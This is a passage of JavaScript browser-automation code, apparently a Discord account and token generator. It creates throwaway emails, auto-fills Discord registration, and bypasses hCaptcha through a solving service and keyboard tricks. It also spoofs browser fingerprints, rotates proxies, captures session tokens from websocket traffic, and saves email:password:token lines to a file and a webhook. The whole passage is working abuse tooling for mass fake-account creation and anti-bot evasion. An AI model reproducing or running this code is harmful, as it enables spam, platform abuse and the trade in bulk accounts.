                                            console.log("[PROCESS RUNNING] EMAIL VERIFY | VERIFY MAIL RECEIVED (" + _EMAIL + ")");

                                            var config = {
                                                "msg": "weblog",
                                                "type": "genmsg",
                                                "text": "Log : email recevied | " + _EMAIL
                                            };
                                            victim.send("msg", config);

                                            await MailPage.click("[title*=Discord]");

                                            await MailPage.waitForSelector("a[href*='discord'][style*=background]", { timeout: 5000 });

                                            await FUNCTION_DELAY(1000);

                                            var holdProgress2 = true;
                                            while (holdProgress2) {
                                                try {
                                                    if (smsGen) {
                                                        console.log("[PROCESS RUNNING] EMAIL VERIFY | MAILPAGE LENGTH CATCH LOOP (SMS) (" + pageList.length + ")");
                                                        pageList = await browser.pages();
                                                        if (pageList.length == 3) {
                                                            console.log("[PROCESS RUNNING] EMAIL VERIFY | CLOSING MAILPAGE (SMS)");
                                                            await pageList[1].close();
                                                            captchaPage = pageList[2];
                                                            holdProgress2 = false;
                                                            break;
                                                        } else {
                                                            console.log("[PROCESS RUNNING] EMAIL VERIFY | CLICKING VERIFY LINK (SMS)");
                                                            await MailPage.click("td > a[href*='discord'][style*=background]");
                                                        };
                                                    } else {
                                                        console.log("[PROCESS RUNNING] EMAIL VERIFY | MAILPAGE LENGTH CATCH LOOP (NO SMS)");
                                                        pageList = await browser.pages();
                                                        if (pageList.length == 2) {
                                                            console.log("[PROCESS RUNNING] EMAIL VERIFY | CLOSING MAILPAGE (NO SMS)");
                                                            await pageList[0].close();
                                                            captchaPage = pageList[1];
                                                            holdProgress2 = false;
                                                            break;
                                                        } else {
                                                            console.log("[PROCESS RUNNING] EMAIL VERIFY | CLICKING VERIFY LINK (NO SMS)");
                                                            await MailPage.click("td > a[href*='discord'][style*=background]");
                                                        };
                                                    };
                                                    await FUNCTION_DELAY(1500);
                                                } catch (e) {
                                                    console.log("[PROCESS RUNNING] EMAIL VERIFY | UNKNOWN ERROR OCCURRED (PAGE CATCH) ->");
                                                    console.log(e);
                                                };
                                            };

                                            cc = false;
                                            break;
                                        } catch (e) {
                                            console.log("[PROCESS RUNNING] EMAIL VERIFY | UNKNOWN ERROR OCCURRED ->");
                                            console.log(e);
                                        };
                                    };
                                } else {
                                    break;
                                };
                            } catch (e) {
                                console.log("unknown error during verify email ->");
                                console.log(e);
                            };
                            await FUNCTION_DELAY(1000);
                        };
                        if (verifyObj[_EMAIL] == false) {
                            try { await browser.close(); } catch { };

                            await FUNCTION_MAIL_REMOVE();

                            console.log("email is not received for 3 minutes");

                            resolve("false:email is not received for 3 minutes");
                            return;
                        };
                        if (mailserver == "1") {
                            emailData = emailData.data.data;
                            console.log(emailData);
                            emailData = emailData.replace(/\r?\n|\r/g, "").split("Verify Email: ")[1].split("3D-3D")[0];
                            emailData = emailData.replace(/\=/g, "") + "3D-3D";
                            emailData = emailData.replace("?upn3D", "?upn=");
                            emailData = emailData.split("bgcolor3D'#5865f2'><a href3D")[1].split(" style3Dtext-decoration:")[0].replace("?upn3D", "?upn=");
                        } else if (mailserver == "3") {
                            emailData = emailData[0].body_text.split("Verify Email: ")[1].trim();
                        } else if (mailserver == "2" || mailserver == "4") {
                            var bypassVal = await FUNCTION_BYPASS_CAPTCHA(captchaPage);

                            if (bypassVal.split(":")[0] == "true") {
                                console.log(bypassVal.split(":")[1]);
                                var config = {
                                    "msg": "weblog",
                                    "type": "genmsg",
                                    "text": "Log : " + bypassVal.split(":")[1]
                                };
                                victim.send("msg", config);
                            } else {
                                console.log(bypassVal.split(":")[1]);
                                resolve("false:" + bypassVal.split(":")[1]);
                                return;
                            };

                            await FUNCTION_DELAY(2000);

                            if (smsGen) {
                                await pageList[2].close();
                            } else {
                                await pageList[1].close();
                            };

                            resolve("true:account email verified");
                            return;
                        };
                        await MailPage.goto(emailData);
                        await MailPage.waitForSelector("h3.title-3FQ39e");
                        if (await MailPage.innerText("h3.title-3FQ39e") !== "Email Verified!") {
                            const bypassVal = await FUNCTION_BYPASS_CAPTCHA(MailPage);

                            if (bypassVal.split(":")[0] == "true") {
                                console.log(bypassVal.split(":")[1]);
                                var config = {
                                    "msg": "weblog",
                                    "type": "genmsg",
                                    "text": "Log : " + bypassVal.split(":")[1]
                                };
                                victim.send("msg", config);
                            } else {
                                console.log(bypassVal.split(":")[1]);
                                resolve("false:" + bypassVal.split(":")[1]);
                                return;
                            };
                        };

                        console.log("account email verified");

                        await FUNCTION_MAIL_REMOVE();

                        resolve("true:account email verified");
                        return;
                    } catch (e) {
                        console.log("verify email error");
                        console.log(e);
                        resolve(e);
                    };
                });
            };

            async function FUNCTION_DOCUMENT_QUERY(_ELEMENT, _WORK, _VALUE, _INFONAME, _TEXT) {
                return new Promise(async function (resolve) {
                    try {
                        var _grabElement;
                        if (_VALUE == true) {
                            _grabElement = await MainPage.$(_ELEMENT + "[" + _INFONAME.split(":")[0] + "=" + _INFONAME.split(":")[1] + "]");
                        } else if (_VALUE == false) {
                            _grabElement = await MainPage.$(_ELEMENT + "[" + _INFONAME.split(":")[0] + "]");
                        };

                        try {
                            await _grabElement.focus();
                        } catch {

                        };

                        if (_WORK == "type") {
                            await MainPage.keyboard.type(_TEXT);
                        } else if (_WORK == "click") {
                            await _grabElement.click();
                        };

                        await FUNCTION_DELAY(110);

                        resolve(true);
                    } catch (e) {
                        resolve(false);
                    };
                });
            };

            async function FUNCTION_CLICK_DATE(_NAME, _MIN_NUMB, _MAX_NUMB) {
                // var i = await MainPage.$("[class*=input" + _NAME + "]");
                // await i.click();

                var r = Math.floor(Math.random() * (_MAX_NUMB - _MIN_NUMB + 1)) + _MIN_NUMB;

                // await MainPage.waitForSelector("[class*=option]");
                // await MainPage.$eval("[class$=option]", function (e, r) { e.parentNode.childNodes[r].click() }, r);

                if (_NAME == "Year") {
                    r += 1970;
                };
                await FUNCTION_DELAY(330);
                await MainPage.keyboard.press("Tab");
                await FUNCTION_DELAY(330);
                console.log("typetext : " + r);
                await MainPage.keyboard.type(r + "");
                await FUNCTION_DELAY(330);

                return r;
            };

            function FUNCTION_CHECK_CAPTCHA(PPage) {
                return new Promise(async function (resolve) {
                    try {
                        await PPage.waitForSelector("[src*=sitekey]", { "timeout": 3000 });
                        resolve("true");
                        return;
                    } catch (e) {
                        resolve("false");
                        return;
                    };
                });
            };

            function FUNCTION_BYPASS_BY_METHOD(PPage) {
                return new Promise(async function (resolve) {
                    if (configCatpcha.use == true && configCatpcha.module == "CAPTCHA_COOKIE") {
                        try {
                            console.log("[PROCESS] CAPTCHA | BYPASS START (COOKIE)");

                            await PPage.keyboard.press("Tab");
                            await FUNCTION_DELAY(500);

                            await PPage.keyboard.press("Enter");
                            await FUNCTION_DELAY(2000);

                            console.log("[PROCESS] CAPTCHA | BYPASS END (COOKIE)");

                            if (await FUNCTION_CHECK_CAPTCHA(PPage) == "true") {
                                console.log("[PROCESS] CAPTCHA | BYPASS FAIL (COOKIE)");
                                resolve("false");
                            } else {
                                console.log("[PROCESS] CAPTCHA | BYPASS SUCCESS (COOKIE)");
                                resolve("true");
                            };
                        } catch (e) {
                            console.log("-----------COOKIE ERROR-----------");
                            console.log(e);
                            console.log("--------------------------------");
                            resolve("false");
                        };
                        return;
                    } else if (configCatpcha.use == true && configCatpcha.module == "CAPTCHA_2CAPTCHA") {
                        try {
                            console.log("[PROCESS] CAPTCHA | BYPASS START (2CAPTCHA)");

                            //FUNCTION_DELAY_DOIT(PPage, 4000, "Escape");

                            await PPage.solveRecaptchas();

                            console.log("[PROCESS] CAPTCHA | BYPASS END (2CAPTCHA)");

                            if (await FUNCTION_CHECK_CAPTCHA(PPage) == "true") {
                                console.log("[PROCESS] CAPTCHA | BYPASS FAIL (2CAPTCHA)");
                                resolve("false");
                            } else {
                                console.log("[PROCESS] CAPTCHA | BYPASS SUCCESS (2CAPTCHA)");
                                resolve("true");
                            };
                        } catch (e) {
                            console.log("-----------2CAP ERROR-----------");
                            console.log(e);
                            console.log("--------------------------------");
                            resolve("false");
                        };
                        return;
                    } else if (configCatpcha.use == true && configCatpcha.module == "CAPTCHA_IMAGE") {
                        try {
                            console.log("[PROCESS] CAPTCHA | BYPASS START (IMAGE)");

                            await PPage.keyboard.press("Tab");
                            await FUNCTION_DELAY(500);

                            await PPage.keyboard.press("Enter");
                            await FUNCTION_DELAY(2000);

                            console.log("[PROCESS] CAPTCHA | BYPASS END (IMAGE)");

                            var holdProgress = true;
                            while (holdProgress) {
                                if (await FUNCTION_CHECK_CAPTCHA(PPage) == "false") {
                                    holdProgress = false;
                                    break;
                                };

                                await FUNCTION_DELAY(1000);
                            };

                            console.log("[PROCESS] CAPTCHA | BYPASS SUCCESS (IMAGE)");
                            resolve("true");
                        } catch (e) {
                            console.log("-----------IMAGE ERROR-----------");
                            console.log(e);
                            console.log("--------------------------------");
                            resolve("false");
                        };
                        return;
                    } else if (configCatpcha.use == true && configCatpcha.module == "CAPTCHA_CUSTOM") {
                        try {
                            console.log("[PROCESS] CAPTCHA | BYPASS START (CUSTOM)");

                            var holdProgress = true;
                            while (holdProgress) {
                                if (await FUNCTION_CHECK_CAPTCHA(PPage) == "false") {
                                    holdProgress = false;
                                    break;
                                };

                                await FUNCTION_DELAY(1000);
                            };

                            console.log("[PROCESS] CAPTCHA | BYPASS SUCCESS (CUSTOM)");
                            resolve("true");
                        } catch (e) {
                            console.log("-----------CUSTOM ERROR-----------");
                            console.log(e);
                            console.log("--------------------------------");
                            resolve("false");
                        };
                        return;
                    };
                });
            };

            function FUNCTION_BYPASS_CAPTCHA(PPage, justClick, idaj) {
                return new Promise(async function (resolve) {
                    try {
                        console.log("[PROCESS RUNNING] CAPTCHA | BYPASS START");

                        var config = {
                            "msg": "weblog",
                            "type": "genmsg",
                            "text": "Log : starting to bypass captcha..."
                        };
                        victim.send("msg", config);

                        await FUNCTION_DELAY(1300);

                        if (await FUNCTION_CHECK_CAPTCHA(PPage) == "false") {
                            console.log("[PROCESS RUNNING] CAPTCHA | PRIMARY CAPTCHA NOT FOUND");

                            var config = {
                                "msg": "weblog",
                                "type": "genmsg",
                                "text": "Log : captcha not found"
                            };
                            victim.send("msg", config);

                            resolve("true:captcha not found");
                            return;
                        };

                        console.log("[PROCESS RUNNING] CAPTCHA | PRIMARY CAPTCHA NOT FOUND");

                        await FUNCTION_DELAY(1500);

                        try {
                            if (justClick == true && configCatpcha.module != "CAPTCHA_IMAGE" && configCatpcha.module != "CAPTCHA_CUSTOM") {
                                await PPage.keyboard.press("Tab");
                                await FUNCTION_DELAY(500);

                                await PPage.keyboard.press("Enter");
                                await FUNCTION_DELAY(2000);

                                if (await FUNCTION_CHECK_CAPTCHA(PPage) == "false") {
                                    console.log("[PROCESS RUNNING] CATPCHA | BYPASSED (JUSTCLICK)");
                                    resolve("true:captcha bypassed (justClick)");
                                    return;
                                };
                            };

                            if (await FUNCTION_BYPASS_BY_METHOD(PPage) == "false") {
                                await FUNCTION_DELAY(5000);
                                if (await FUNCTION_BYPASS_BY_METHOD(PPage) == "false") {
                                    await FUNCTION_DELAY(5000);
                                    if (await FUNCTION_BYPASS_BY_METHOD(PPage) == "false") {
                                        resolve("false:captcha bypass failed");
                                        return;
                                    };
                                };
                            };

                            resolve("true:captcha bypassed");
                            return;
                        } catch (e) {
                            console.log("hcaptcha click error");
                            console.log(e);
                            resolve("flase:hcaptcha click error");
                            return;
                        };
                    } catch (e) {
                        console.log("captcha bypass error");
                        console.log(e);
                        resolve("false:captcha bypass error");
                        return;
                    };
                });
            };

            function FUNCTION_REMOVE_COOL(_COUNT) {
                if (proxyGen == false) {
                    async function _a() {
                        var _COOL = true;
                        while (_COOL) {
                            if (VALUE_TRY_LIST_COOL[_COUNT] == false) {
                                _COOL = false;
                                break;
                            } else {
                                console.log("removing cool " + VALUE_TRY_LIST_COOL[_COUNT]);
                                if (VALUE_TRY_LIST_COOL[_COUNT] != 0) {
                                    VALUE_TRY_LIST_COOL[_COUNT] = VALUE_TRY_LIST_COOL[_COUNT] - 1;
                                } else {
                                    _COOL = false;
                                    break;
                                };
                                await FUNCTION_DELAY(1000);
                            };
                        };
                    };
                    _a();
                };
            };

            async function FUNCTION_REGISTER() {
                if (verifyMail == true) {
                    MailPage = await browser.newPage();

                    await FUNCTION_DELAY(1100);

                    try {
                        PuppeteerBlocker.fromPrebuiltAdsAndTracking(fetch).then((blocker) => {
                            blocker.enableBlockingInPage(MailPage);
                        });
                    } catch (e) {
                        console.log("adblock plugin fail ->");
                        console.log(e);
                    };


                    if (mailserver == "1") {
                        _PREFIX = await FUNCTION_MAKEHASH(15);
                        try {
                            MAIL_MODULE = new mailtm;
                            MAIL_DOMAIN = await MAIL_MODULE.getDomains();
                            if (!MAIL_DOMAIN.status) {
                                try { await browser.close(); } catch { };
                                FUNCTION_START_GEN();
                                return;
                            } else {
                                _EMAIL = _PREFIX + "@" + MAIL_DOMAIN.data[0].domain;
                            };
                            var RES_REGISTER = await MAIL_MODULE.register(_EMAIL, _PASSWORD);
                            if (!RES_REGISTER.status) {
                                try { await browser.close(); } catch { };
                                var config = {
                                    "msg": "weblog",
                                    "type": "generror",
                                    "text": "Error : generating e-mail [1]"
                                };
                                victim.send("msg", config);
                                await FUNCTION_DELAY(1000);
                                FUNCTION_START_GEN();
                                return;
                            } else {
                                RES_REGISTER = RES_REGISTER.data;
                            };
                            var RES_LOGIN = await MAIL_MODULE.login(_EMAIL, _PASSWORD);
                            if (!RES_LOGIN.status) {
                                try { await browser.close(); } catch { };
                                var config = {
                                    "msg": "weblog",
                                    "type": "generror",
                                    "text": "Error : generating e-mail [2]"
                                };
                                victim.send("msg", config);
                                await FUNCTION_DELAY(1000);
                                FUNCTION_START_GEN();
                                return;
                            } else {
                                RES_LOGIN = RES_LOGIN.data;
                            };
                        } catch (e) {
                            try { await browser.close(); } catch { };
                            var config = {
                                "msg": "weblog",
                                "type": "generror",
                                "text": "Error : generating e-mail [3]\n" + e
                            };
                            victim.send("msg", config);
                            await FUNCTION_DELAY(1000);
                            FUNCTION_START_GEN();
                            return;
                        };
                    } else if (mailserver == "2") {
                        if (proxyGen && proxyUser == "2") {
                            await MailPage.authenticate({
                                username: _PROXY.split("@")[0].split(":")[0],
                                password: _PROXY.split("@")[0].split(":")[1]
                            });
                        };
                        await MailPage.bringToFront();
                        try {
                            await MailPage.goto("https://mail.gw/en/", { "timeout": 30000, "waitUntil": pageWaitValue });
                        } catch (e) {
                            console.log("Network Error");
                            console.log(e);
                            try { await browser.close(); } catch { };
                            var config = {
                                "msg": "weblog",
                                "type": "generror",
                                "text": "Error : network"
                            };
                            victim.send("msg", config);
                            await FUNCTION_DELAY(1000);
                            FUNCTION_START_GEN();
                            return;
                        };

                        await FUNCTION_DELAY(1000);

                        try {
                            var info_id = "input[type=email]";
                            await MailPage.waitForSelector(info_id, { "timeout": 12000 });

                            await FUNCTION_DELAY(330);

                            var holdProgress = true;

                            while (holdProgress) {
                                try {
                                    var cmd = `document.querySelector("input[type=email]").value;`;
                                    _EMAIL = await MailPage.evaluate(cmd);
                                } catch (e) {
                                    console.log("grab mail error (1) ->");
                                    console.log(e);
                                };
                                try {
                                    if (!_EMAIL.includes("@")) {
                                        console.log("retrying to grab email");
                                        await FUNCTION_DELAY(1000);
                                    } else {
                                        holdProgress = false;
                                        break;
                                    };
                                } catch (e) {
                                    console.log("grab mail error (1) ->");
                                    console.log(e);
                                };
                            };

                            console.log("email: " + _EMAIL);
                        } catch (e) {
                            try { await browser.close(); } catch { };
                            var config = {
                                "msg": "weblog",
                                "type": "generror",
                                "text": "Error : generating e-mail<br>" + e
                            };
                            victim.send("msg", config);
                            await FUNCTION_DELAY(1000);
                            FUNCTION_START_GEN();
                            return;
                        };

                        // _PREFIX = await FUNCTION_MAKEHASH(15);
                        // try {
                        //     MAIL_MODULE = new mailtm;
                        //     MAIL_DOMAIN = await MAIL_MODULE.getDomainsGW();
                        //     if (!MAIL_DOMAIN.status) {
                        //         try { await browser.close(); } catch { };
                        //         FUNCTION_START_GEN();
                        //         return;
                        //     } else {
                        //         _EMAIL = _PREFIX + "@" + MAIL_DOMAIN.data[0].domain;
                        //     };
                        //     var RES_REGISTER = await MAIL_MODULE.registerGW(_EMAIL, _PASSWORD);
                        //     if (!RES_REGISTER.status) {
                        //         try { await browser.close(); } catch { };
                        //         var config = {
                        //             "msg": "weblog",
                        //             "type": "generror",
                        //             "text": "Error : generating e-mail [1]"
                        //         };
                        //         victim.send("msg", config);
                        //         await FUNCTION_DELAY(1000);
                        //         FUNCTION_START_GEN();
                        //         return;
                        //     } else {
                        //         RES_REGISTER = RES_REGISTER.data;
                        //     };
                        //     var RES_LOGIN = await MAIL_MODULE.loginGW(_EMAIL, _PASSWORD);
                        //     if (!RES_LOGIN.status) {
                        //         try { await browser.close(); } catch { };
                        //         var config = {
                        //             "msg": "weblog",
                        //             "type": "generror",
                        //             "text": "Error : generating e-mail [2]"
                        //         };
                        //         victim.send("msg", config);
                        //         await FUNCTION_DELAY(1000);
                        //         FUNCTION_START_GEN();
                        //         return;
                        //     } else {
                        //         RES_LOGIN = RES_LOGIN.data;
                        //     };
                        // } catch (e) {
                        //     try { await browser.close(); } catch { };
                        //     var config = {
                        //         "msg": "weblog",
                        //         "type": "generror",
                        //         "text": "Error : generating e-mail [3]<br>" + e
                        //     };
                        //     victim.send("msg", config);
                        //     await FUNCTION_DELAY(1000);
                        //     FUNCTION_START_GEN();
                        //     return;
                        // };
                    } else if (mailserver == "3") {
                        _PREFIX = await FUNCTION_MAKEHASH(10);
                        try {
                            var random = Math.floor(Math.random() * mailList.length);
                            _EMAIL = _PREFIX + "@" + mailList[random];
                            await axios.post("https://api.internal.temp-mail.io/api/v3/email/new", { "domain": mailList[random], "name": _PREFIX });
                        } catch (e) {
                            try { await browser.close(); } catch { };
                            var config = {
                                "msg": "weblog",
                                "type": "generror",
                                "text": "Error : generating e-mail<br>" + e
                            };
                            victim.send("msg", config);
                            await FUNCTION_DELAY(1000);
                            FUNCTION_START_GEN();
                            return;
                        };
                    } else if (mailserver == "4") {
                        if (proxyGen && proxyUser == "2") {
                            await MailPage.authenticate({
                                username: _PROXY.split("@")[0].split(":")[0],
                                password: _PROXY.split("@")[0].split(":")[1]
                            });
                        };
                        await MailPage.bringToFront();
                        try {
                            await MailPage.goto("https://temp-mail.org/en/", { "timeout": 30000, "waitUntil": pageWaitValue });
                        } catch (e) {
                            console.log("Network Error");
                            console.log(e);
                            try { await browser.close(); } catch { };
                            var config = {
                                "msg": "weblog",
                                "type": "generror",
                                "text": "Error : network"
                            };
                            victim.send("msg", config);
                            await FUNCTION_DELAY(1000);
                            FUNCTION_START_GEN();
                            return;
                        };

                        await FUNCTION_DELAY(1000);

                        try {
                            var info_id = "#mail";
                            await MailPage.waitForSelector(info_id, { "timeout": 12000 });

                            await FUNCTION_DELAY(330);

                            var holdProgress = true;

                            while (holdProgress) {
                                try {
                                    var cmd = `document.querySelector("#mail").value;`;
                                    _EMAIL = await MailPage.evaluate(cmd);
                                } catch (e) {
                                    console.log("grab mail error (1) ->");
                                    console.log(e);
                                };
                                try {
                                    if (_EMAIL.includes("Loading")) {
                                        console.log("retrying to grab email");
                                        await FUNCTION_DELAY(1000);
                                    } else {
                                        holdProgress = false;
                                        break;
                                    };
                                } catch (e) {
                                    console.log("grab mail error (1) ->");
                                    console.log(e);
                                };
                            };

                            console.log("email: " + _EMAIL);
                        } catch (e) {
                            try { await browser.close(); } catch { };
                            var config = {
                                "msg": "weblog",
                                "type": "generror",
                                "text": "Error : generating e-mail<br>" + e
                            };
                            victim.send("msg", config);
                            await FUNCTION_DELAY(1000);
                            FUNCTION_START_GEN();
                            return;
                        };
                    };

                    var config = {
                        "msg": "weblog",
                        "type": "genmsg",
                        "text": "Log : email generated | " + _EMAIL
                    };
                    victim.send("msg", config);

                    await MainPage.bringToFront();

                    try {
                        if (proxyGen && proxyUser == "2") {
                            await MainPage.authenticate({
                                username: _PROXY.split("@")[0].split(":")[0],
                                password: _PROXY.split("@")[0].split(":")[1]
                            });
                        };
                        await FUNCTION_DELAY(880);
                        const randomUseragent = require("random-useragent");
                        const userAgent = randomUseragent.getRandom();
                        const UA = userAgent || USER_AGENT;
                        await MainPage.setUserAgent(UA);
                        await MainPage.setJavaScriptEnabled(true);
                        await MainPage.setDefaultNavigationTimeout(0);
                        await MainPage.setRequestInterception(true);
                        await MainPage.evaluateOnNewDocument(() => {
                            const originalQuery = window.navigator.permissions.query;
                            return window.navigator.permissions.query = (parameters) => (
                                parameters.name === "notifications" ?
                                    Promise.resolve({ state: Notification.permission }) :
                                    originalQuery(parameters)
                            );
                        });
                        await MainPage.evaluateOnNewDocument(() => {
                            Object.defineProperty(navigator, "plugins", {
                                get: () => [1, 2, 3, 4, 5]
                            });
                        });
                        await MainPage.evaluateOnNewDocument(() => {
                            Object.defineProperty(navigator, "languages", {
                                get: () => ["en-US", "en"]
                            });
                        });
                        await FUNCTION_DELAY(880);
                        await MainPage.goto("https://discord.com/register", { "timeout": 30000, "waitUntil": pageWaitValue });
                    } catch (e) {
                        console.log("Network Error");
                        console.log(e);
                        try { await browser.close(); } catch { };
                        var config = {
                            "msg": "weblog",
                            "type": "generror",
                            "text": "Error : network"
                        };
                        victim.send("msg", config);
                        await FUNCTION_DELAY(1000);
                        FUNCTION_START_GEN();
                        return;
                    };

                    await FUNCTION_DELAY(1000);

                    await FUNCTION_DOCUMENT_QUERY("input", "type", true, "name:email", _EMAIL);
                    await FUNCTION_DOCUMENT_QUERY("input", "type", true, "name:username", _USERNAME);
                    await FUNCTION_DOCUMENT_QUERY("input", "type", true, "name:password", _PASSWORD);

                    await FUNCTION_CLICK_DATE("Month", 0, 11);
                    await FUNCTION_CLICK_DATE("Day", 0, 27);
                    await FUNCTION_CLICK_DATE("Year", 17, 24);

                    // MainPage.waitForSelector("input[type*=checkbox]").then(() => {
                    //     MainPage.$eval("input[type*=checkbox]", el => el.click());
                    // }).catch(e => { });

                    var holdProgress = true;
                    while (holdProgress) {
                        var clickResolveValue = await FUNCTION_DOCUMENT_QUERY("button", "click", true, "type:submit", "null");
                        if (clickResolveValue == false) {
                            holdProgress = false;
                            break;
                        };
                        await FUNCTION_DELAY(1000);
                    };

                    //await MainPage.$eval("button[type=submit]", (el) => el.click());

                    const bypassVal = await FUNCTION_BYPASS_CAPTCHA(MainPage, true, true);

                    if (bypassVal.split(":")[0] == "true") {
                        console.log(bypassVal.split(":")[1]);
                        var config = {
                            "msg": "weblog",
                            "type": "genmsg",
                            "text": "Log : " + bypassVal.split(":")[1]
                        };
                        victim.send("msg", config);
                    } else {
                        console.log(bypassVal.split(":")[1]);
                        try { await browser.close(); } catch { };
                        var config = {
                            "msg": "weblog",
                            "type": "generror",
                            "text": "Error : " + bypassVal.split(":")[1]
                        };
                        victim.send("msg", config);
                        await FUNCTION_DELAY(1000);
                        FUNCTION_START_GEN();
                        return;
                    };

                    if (moduleT == "1") {
                        await MainPage.waitForURL("https://discord.com/welcome/", { "waitUntil": pageWaitValue });
                    } else if (moduleT == "2") {
                        let holdProgress = true;
                        while (holdProgress) {
                            await FUNCTION_DELAY(300);
                            if (MainPage.url().includes("/channels")) {
                                holdProgress = false;
                            };
                        };
                    };

                    if (proxyGen == false) {
                        VALUE_TRY_COUNT++;
                        VALUE_TRY_LIST_COOL.push(180);
                        FUNCTION_REMOVE_COOL(VALUE_TRY_COUNT - 1);
                    };

                    console.log("primary gen finished");

                    var config = {
                        "msg": "weblog",
                        "type": "genmsg",
                        "text": "Log : primary gen finished | " + _EMAIL
                    };
                    victim.send("msg", config);

                    if (smsGen) {
                        var client = MainPage._client;
                        client.on("Network.webSocketFrameSent", ({ requestId, timestamp, response }) => {
                            try {
                                const json = JSON.parse(response.payloadData);
                                if (_TOKEN == false && json["d"]["token"]) {
                                    _TOKEN = json["d"]["token"];
                                };
                            } catch (e) {

                            };
                        });

                        const verifyMail = await FUNCTION_VERIFY_EMAIL();

                        if (verifyMail.split(":")[0] == "true") {
                            console.log(verifyMail.split(":")[1]);
                            var config = {
                                "msg": "weblog",
                                "type": "genmsg",
                                "text": "Log : " + verifyMail.split(":")[1]
                            };
                            victim.send("msg", config);
                        } else {
                            console.log(verifyMail.split(":")[1]);
                            try { await browser.close(); } catch { };
                            var config = {
                                "msg": "weblog",
                                "type": "generror",
                                "text": "Error : " + verifyMail.split(":")[1]
                            };
                            victim.send("msg", config);
                            await FUNCTION_DELAY(1000);
                            FUNCTION_START_GEN();
                            return;
                        };

                        const verifyPhone = await FUNCTION_VERIFY_PHONE();

                        if (verifyPhone.split(":")[0] == "false") {
                            try { await browser.close(); } catch { };
                            var config = {
                                "msg": "weblog",
                                "type": "generror",
                                "text": "Error : " + verifyPhone.split(":")[1]
                            };
                            victim.send("msg", config);
                            await FUNCTION_DELAY(1000);
                            FUNCTION_START_GEN();
                            return;
                        } else {
                            var config = {
                                "msg": "weblog",
                                "type": "genmsg",
                                "text": "Log : " + verifyPhone.split(":")[1]
                            };
                            victim.send("msg", config);
                        };

                        try {
                            if (capVerify) {
                                var code = await FUNCTION_MAKEHASH(5);
                                await MainPage.screenshot({ path: code + ".png", fullPage: true });
                                var config = {
                                    "msg": "weblog",
                                    "type": "genmsg",
                                    "text": "Log : captured (after verify) | " + code + ".png"
                                };
                                victim.send("msg", config);
                            };

                            await browser.close();
                            var config = {
                                "msg": "weblog",
                                "type": "genmsg",
                                "text": "Log : gen finished | " + _EMAIL
                            };
                            victim.send("msg", config);

                            try {
                                if (logGen) {
                                    var cfg = {
                                        "Content-Type": "application/json",
                                        "Authorization": _TOKEN
                                    };
                                    var data = (await axios.get("https://discord.com/api/v8/users/@me", { headers: cfg })).data;
                                    var embed = new MessageBuilder();
                                    embed = embed.setTitle("Nefew Discord Server");
                                    embed = embed.setURL("https://nefew.kr/discord");
                                    embed = embed.addField("! Token Generated !", `Email : ${data.email}\nId : ${data.id}\nNickTag : ${data.username}#${data.discriminator}`, true);
                                    embed = embed.setColor("#00b0f4");
                                    embed = embed.setFooter("Nefew Discord Token Generator", "https://cdn.discordapp.com/embed/avatars/0.png");
                                    embed = embed.setTimestamp();

                                    hook.send(embed);
                                };
                            } catch (e) {
                                console.log(e);
                            };

                            fs.appendFileSync(tokenDir, "\n" + _EMAIL + ":" + _PASSWORD + ":" + _TOKEN);

                            public_genlist[meCount].created++;
                            public_created++;

                            FUNCTION_START_GEN();
                            return;
                        } catch (e) {
                            try { await browser.close(); } catch { };
                            var config = {
                                "msg": "weblog",
                                "type": "generror",
                                "text": "Error : unknown error\n" + e
                            };
                            victim.send("msg", config);
                            await FUNCTION_DELAY(1000);
                            FUNCTION_START_GEN();
                            return;
                        };
                    } else {
                        var client = MainPage._client;
                        client.on("Network.webSocketFrameSent", ({ requestId, timestamp, response }) => {
                            async function qq() {
                                try {
                                    const json = JSON.parse(response.payloadData);
                                    if (_TOKEN == false && json["d"]["token"]) {
                                        _TOKEN = json["d"]["token"];
                                    };

                                    await MainPage.close();

                                    const verifyMail = await FUNCTION_VERIFY_EMAIL();

                                    try { await browser.close(); } catch { };

                                    if (verifyMail.split(":")[0] == "true") {
                                        console.log(verifyMail.split(":")[1]);
                                        var config = {
                                            "msg": "weblog",
                                            "type": "genmsg",
                                            "text": "Log : " + verifyMail.split(":")[1]
                                        };
                                        victim.send("msg", config);
                                    } else {
                                        console.log(verifyMail.split(":")[1]);
                                        var config = {
                                            "msg": "weblog",
                                            "type": "generror",
                                            "text": "Error : " + verifyMail.split(":")[1]
                                        };
                                        victim.send("msg", config);
                                        await FUNCTION_DELAY(1000);
                                        FUNCTION_START_GEN();
                                        return;
                                    };

                                    var config = {
                                        "msg": "weblog",
                                        "type": "genmsg",
                                        "text": "Log : gen finished | " + _EMAIL
                                    };
                                    victim.send("msg", config);

                                    try {
                                        if (logGen) {
                                            var cfg = {
                                                "Content-Type": "application/json",
                                                "Authorization": _TOKEN
                                            };
                                            var data = (await axios.get("https://discord.com/api/v8/users/@me", { headers: cfg })).data;
                                            var embed = new MessageBuilder();
                                            embed = embed.setTitle("Nefew Discord Server");
                                            embed = embed.setURL("https://nefew.kr/discord");
                                            embed = embed.addField("! Token Generated !", `Email : ${data.email}\nId : ${data.id}\nNickTag : ${data.username}#${data.discriminator}`, true);
                                            embed = embed.setColor("#00b0f4");
                                            embed = embed.setFooter("Nefew Discord Token Generator", "https://cdn.discordapp.com/embed/avatars/0.png");
                                            embed = embed.setTimestamp();

                                            hook.send(embed);
                                        };
                                    } catch (e) {
                                        console.log(e);
                                    };

                                    fs.appendFileSync(tokenDir, "\n" + _EMAIL + ":" + _PASSWORD + ":" + _TOKEN);

                                    public_genlist[meCount].created++;
                                    public_created++;

                                    await FUNCTION_DELAY(1000);
                                    FUNCTION_START_GEN();
                                    return;
                                } catch (e) {

                                };
                            };
                            qq();
                        });
                    };
                } else {
                    try {
                        if (proxyGen && proxyUser == "2") {
                            await MainPage.authenticate({
                                username: _PROXY.split("@")[0].split(":")[0],
                                password: _PROXY.split("@")[0].split(":")[1]
                            });
                        };
                        await FUNCTION_DELAY(880);
                        await MainPage.goto("https://discord.com/", { "timeout": 30000, "waitUntil": pageWaitValue });
                    } catch (e) {
                        console.log("Network Error");
                        console.log(e);
                        try { await browser.close(); } catch { };
                        var config = {
                            "msg": "weblog",
                            "type": "generror",
                            "text": "Error : network"
                        };
                        victim.send("msg", config);
                        await FUNCTION_DELAY(1000);
                        FUNCTION_START_GEN();
                        return;
                    };

                    console.log("page load end");
                    await FUNCTION_DELAY(1000);

                    var holdProgress = true;

                    while (holdProgress) {
                        try {
                            await MainPage.click("button.button-ZGMevK");
                            await FUNCTION_DELAY(1000);
                            await MainPage.waitForSelector("input[type=text]", { "timeout": 110 });
                            holdProgress = false;
                            break;
                        } catch {

                        };
